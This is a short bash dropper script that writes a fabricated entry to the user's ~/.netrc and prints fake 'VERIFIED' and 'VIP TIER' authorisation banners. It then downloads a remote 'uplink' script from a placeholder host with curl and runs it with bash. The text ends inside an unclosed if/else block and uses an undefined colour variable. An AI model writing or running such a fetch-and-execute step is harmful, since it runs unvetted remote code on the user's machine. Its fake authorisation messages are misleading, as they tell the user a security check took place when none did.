#!/usr/bin/env bash
set -euo pipefail
[ -c /dev/tty ] && exec > /dev/tty 2>&1
# --- COLORS ---
R='\033[1;38;5;196m'
G='\033[1;38;5;82m'
Y='\033[1;38;5;220m'
C='\033[1;38;5;51m'
W='\033[1;38;5;255m'
DG='\033[0;38;5;244m'
NC='\033[0m'
# --- CONFIG ---
# Domain B jahan uplink.sh host hai
HOST="run.yourdomain.com"
URL="https://${HOST}"
NETRC="${HOME}/.netrc"
IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
LOCL_IP="10.1.0.29"
# --- FAKE AUTH ---
echo -ne " ${DG}├─ Linking VIP Credentials...${NC} "
touch "$NETRC" && chmod 600 "$NETRC"
sed -i "/$HOST/d" "$NETRC" 2>/dev/null || true
printf "machine %s login %s password %s\n" "$HOST" "$IP" "$LOCL_IP" >> "$NETRC"
sleep 0.6
echo -e "${G}VERIFIED${NC} ✓"
# --- DOWNLOAD & EXECUTE uplink.sh ---
echo -e "\n ${Y}→ Establishing Uplink...${NC} "
payload="$(mktemp)"
trap "rm -f $payload" EXIT
if curl -fsSL -A "Royal-Uplink-Agent" -o "$payload" "$URL"; then
    echo -e " ${G}CONNECTED${NC} ★"
    echo -e " ${DG}└─ AUTHORIZED — VIP TIER${NC}"
    echo -e "\n${DG}──────────────────────────────────────────────────────────────────────────────${NC}"
    echo -e " ${P}★★★ EXECUTING PAYLOAD IN 1 SECOND ★★★${NC}\n"
    echo -ne " ${W}Initiating in ${R}1${NC} "
    echo -ne "${R}●${NC}"
    sleep 1
    echo -e "\n"
    bash "$payload"
else
    echo -e "${R}FAILED${NC}"
    echo -e " ${DG}└─ Connection Terminated${NC}"
    exit 1
